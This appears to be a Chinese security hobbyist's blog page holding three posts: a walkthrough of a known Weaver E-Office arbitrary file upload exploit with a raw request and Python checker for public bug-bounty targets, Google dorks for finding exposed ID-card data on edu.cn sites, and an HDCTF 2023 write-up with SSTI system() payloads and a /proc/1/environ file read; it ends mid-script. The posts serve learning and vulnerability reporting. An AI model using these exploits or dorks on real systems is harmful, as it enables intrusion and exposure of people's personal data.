<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> CTF</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">CTF</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['欢迎来到f14g的博客', '临渊羡鱼，不如退而结网', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-漏洞盒子公益SRC第一次挖掘"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"
    >漏洞盒子公益SRC第一次挖掘</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/" class="article-date">
  <time datetime="2023-05-05T16:37:25.000Z" itemprop="datePublished">2023-05-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a> / <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/">漏洞盒子公益SRC的第一次挖掘</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="了解漏洞盒子公益SRC"><a href="#了解漏洞盒子公益SRC" class="headerlink" title="了解漏洞盒子公益SRC"></a>了解漏洞盒子公益SRC</h1><p>当时也是打比赛打累了，刚好那周的周末没有比赛，然后就想了解一下漏洞盒子的漏洞提交机制以及都可以提交什么类型的漏洞。里面有很多的企业SRC但是以我弱弱的能力肯定也挖不到，就想先用Nday打几个公益SRC。</p>
<h1 id="漏洞文库"><a href="#漏洞文库" class="headerlink" title="漏洞文库"></a>漏洞文库</h1><p>我经常用的漏洞文库是PeiQi文库</p>
<p><a target="_blank" rel="noopener" href="http://api.orchidstudio.cn/">http://api.orchidstudio.cn/</a></p>
<p>有很多类型的漏洞</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506010835564.png" alt="image-20230506010835564"></p>
<h1 id="第一次利用Nday（漏洞复现）"><a href="#第一次利用Nday（漏洞复现）" class="headerlink" title="第一次利用Nday（漏洞复现）"></a>第一次利用Nday（漏洞复现）</h1><p>我第一次打的是泛微OA E-Office UploadFile.php 任意文件上传漏洞</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011028027.png" alt="image-20230506011028027"></p>
<p>通过POST方式上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId= HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348</span><br><span class="line">Content-Length: 193</span><br><span class="line">Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4</span><br><span class="line"></span><br><span class="line">--e64bdf16c554bbc109cecef6451c26a4</span><br><span class="line">Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">--e64bdf16c554bbc109cecef6451c26a4--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>上传成功的话会出现以下页面</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011412143.png" alt="image-20230506011412143"></p>
<p>然后我们访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/images/logo/logo-eoffice.php</span><br></pre></td></tr></table></figure>

<p>就会成功访问phpinfo</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011551616.png" alt="image-20230506011551616"></p>
<p>说明漏洞存在并可以利用</p>
<h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><p>我常用的是fofa和hunter</p>
<p>在PeiQi文库这个地方有网络测绘，直接复制搜索</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011820951.png" alt="image-20230506011820951"></p>
<p>以fofa举例</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012132428.png" alt="image-20230506012132428"></p>
<p>收集完资产后可以对资产进行检测是否存在漏洞</p>
<h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>如果我们通过一个一个复现的方法显然太慢，所以可以下脚本批量检测，这里我贴一个脚本检测的，但不是批量的，批量检测大家可以试着自己写写</p>
<p>首先就是要通过python的requests模块可以先把BP的post包copy为</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012618843.png" alt="image-20230506012618843"></p>
<p>然后通过写脚本观察返回包是否含有logo-eoffice.php，来判断是否存在漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">efff</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        burp0_url =<span class="string">&quot;http://&quot;</span>+url+<span class="string">&quot;/general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId=&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;LOGIN_LANG&quot;</span>: <span class="string">&quot;cn&quot;</span>, <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;0acfd0a2a7858aa1b4110eca1404d348&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4&quot;</span>&#125;</span><br><span class="line">        burp0_data = <span class="string">&quot;--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\&quot;Filedata\&quot;; filename=\&quot;test.php\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n&quot;</span></span><br><span class="line">        cd=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;logo-eoffice.php&#x27;</span> <span class="keyword">in</span> cd.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在漏洞&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">url=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">efff(url)</span><br></pre></td></tr></table></figure>

<p>如果可以上传logo-eoffice.php，在通过是否能访问phpinfo判断漏洞是否可以利用</p>
<h1 id="漏洞报告"><a href="#漏洞报告" class="headerlink" title="漏洞报告"></a>漏洞报告</h1><p>在写漏洞盒子的漏洞报告时，我的建议是尽量写详细点，像漏洞描述、漏洞修复建议写详细点，到时候评报告质量，相同的漏洞报告质量越高到时候得到的积分可能就越多</p>
<h1 id="挖洞建议"><a href="#挖洞建议" class="headerlink" title="挖洞建议"></a>挖洞建议</h1><p>有的时候挖到漏洞不要尝试深度利用，能够证明漏洞存在就行。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%AC%E7%9B%8Asrc/" rel="tag">公益src</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-edusrc的第一次挖掘"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"
    >edusrc的第一次挖掘</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/" class="article-date">
  <time datetime="2023-05-05T07:42:22.000Z" itemprop="datePublished">2023-05-05</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a> / <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/">edusrc的第一次挖掘</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="edusrc账号获得"><a href="#edusrc账号获得" class="headerlink" title="edusrc账号获得"></a>edusrc账号获得</h1><p>可以通过内部的邀请码然后注册账号，再或者就是非邀请码注册，但是需要你提交一个漏洞审核过之后就会给你发邮件账号密码都在邮件里，当然第一个漏洞审核的非常快，最迟第二天就审核完成了。</p>
<h1 id="挖掘的开始"><a href="#挖掘的开始" class="headerlink" title="挖掘的开始"></a>挖掘的开始</h1><p>在前段时间的下午第一次先尝试挖edusrc，然后浏览一下别人的挖掘思路，然后晚上就自己开始尝试了，当然也顺利拿到属于自己的edusrc账号。</p>
<h1 id="挖掘类型的确定"><a href="#挖掘类型的确定" class="headerlink" title="挖掘类型的确定"></a>挖掘类型的确定</h1><p>对于我这种菜鸡当然要从信息泄露挖起，首先就选择了挖身份信息泄露，首先通过谷歌语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:edu.cn 身份证号</span><br></pre></td></tr></table></figure>

<p>当然现在这种漏洞已经很少了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:edu.cn 四六级成绩</span><br><span class="line">site:edu.cn 计算机等级考试成绩</span><br></pre></td></tr></table></figure>

<p>然后通过筛选就能下载成绩单的地方</p>
<p><img src="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230505155609536.png" alt="image-20230505155609536"></p>
<p>然后通过这种链接下载成绩单</p>
<p>上面有的会直接有sfz号，基本都有证书编号，姓名，然后可以通过中国考试教育网查询信息，上面会含有身份信息。</p>
<p>晚上提交第二天早上就审核通过了，账号到手。</p>
<p>该网站漏洞已经被修复，不要在尝试挖该站点的漏洞</p>
<p>但是通过上述收集信息的方式已经被人打烂了，现在在用这种方式去挖基本上全是重复，所以可以尝试其他思路进行挖掘。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/edusrc/" rel="tag">edusrc</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023-HDCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/04/22/2023-HDCTF/"
    >2023 HDCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/04/22/2023-HDCTF/" class="article-date">
  <time datetime="2023-04-22T12:34:18.000Z" itemprop="datePublished">2023-04-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><p>随便点点就弹出flag了</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422130844824.png" alt="image-20230422130844824"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;We13ome_t@_HDCTF_2o23&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>首先扫描目录</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131014866.png" alt="image-20230422131014866"></p>
<p>访问</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131048842.png" alt="image-20230422131048842"></p>
<p>应该是smarty  ssti在根据题目提示用post传data</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422131231234.png" alt="image-20230422131231234"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422131304639.png" alt="image-20230422131304639"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;204f2649-fb8f-4bd5-bd14-3940f2d5b780&#125;</span><br></pre></td></tr></table></figure>

<h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>根据题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I wanna eat some yummy food :(</span><br><span class="line">can you give me some?</span><br></pre></td></tr></table></figure>

<p>应该是先看看cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZENVMw.8YLXYcxD4iC4qGOrbXC2SdlHJiE</span><br><span class="line">&#123;&quot;passport&quot;:&quot;YamiYami&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这解码之后也没用呀</p>
<p>然后就去看了文件上传的地方发现.php文件都可以上传，但是没有给文件路径还是不好搞</p>
<p>又去看了看pwd 发现页面有个  &#x2F;app联想到ssti</p>
<p>无论怎么我去注入但是不成功</p>
<p>所以这应该是先上传文件然后，在去ssti，尝试了无数次方法就是出不来</p>
<p>然后去做了一个签到re</p>
<p>回来发现一直忽略了Read something  这是个url跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?url=https://baidu.com</span><br></pre></td></tr></table></figure>

<p>刚开始就直接把他忽略，但是再次看发现read,就想着能不能读取文件，试了伪协议不行，又卡了然后就看到一篇文章可以读取环境变量，就尝试了一下结果真出了</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422133632643.png" alt="image-20230422133632643"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?url=file:///proc/1/environ</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422133535890.png" alt="image-20230422133535890"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;449ff62b-d28a-4fd0-9e20-fe20e292df51&#125;</span><br></pre></td></tr></table></figure>











<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>flag直接在题目代码里  一血</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131417557.png" alt="image-20230422131417557"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;0b3663ed-67e4-44e2-aee7-7c2d8665b63c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h2><p>因为p是256位，q,r是512位</p>
<p>所以直接对P,Q开方就得到p,q  (一血)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749</span></span><br><span class="line">c = <span class="number">7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">93595995503882796484948942664787567679411018850571035558047095185699253142469</span></span><br><span class="line">q=<span class="number">10626484086425759109526601843431131274302413270645909659804218687679714714707826956012068057535486307660248767234433303462363381171495481245390248120740549</span></span><br><span class="line">r=n//p//q</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HDCTF&#123;08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="爬过小山去看云"><a href="#爬过小山去看云" class="headerlink" title="爬过小山去看云"></a>爬过小山去看云</h2><p>三血</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne</span><br><span class="line">在山的那头，有3个人，4只鸟，19只羊，11朵云</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显的希尔（hill）密码</p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourpiniseightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofourx</span><br></pre></td></tr></table></figure>

<p>读其中的内容得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">842084210884024084010124</span><br></pre></td></tr></table></figure>

<p>又是很明显的云影密码</p>
<p>由于很短直接手撸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">842 8421 884 24 84 1 124</span><br><span class="line">14 15 20 6 12 1 7</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">NOTFLAG</span><br><span class="line">NSSCTF&#123;NOTFLAG&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Math-Rsa"><a href="#Math-Rsa" class="headerlink" title="Math_Rsa"></a>Math_Rsa</h2><p>简单构造一个多项式环就OK了</p>
<p>a&#x3D;pow(p,2,r)</p>
<p>$ a \equiv p^2 mod r$</p>
<p>a，r已知求p,构造多项式环</p>
<p>$f&#x3D;p^2-a$</p>
<p>求出来p之后就是普通的RSA了</p>
<p>sage脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line">r = <span class="number">145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line">a = <span class="number">55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line">c = <span class="number">12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">P.&lt;p&gt; = PolynomialRing(Zmod(r))</span><br><span class="line">f=p^<span class="number">2</span>-a</span><br><span class="line">f=f.monic()</span><br><span class="line">p=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span 